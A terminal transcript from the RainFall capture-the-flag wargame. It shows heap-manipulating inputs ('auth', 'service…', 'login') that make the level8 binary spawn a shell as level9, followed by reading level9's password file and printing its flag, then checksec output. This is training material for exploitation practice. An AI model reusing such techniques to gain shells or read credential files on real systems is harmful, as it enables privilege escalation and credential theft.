``` bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ su level9
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/
```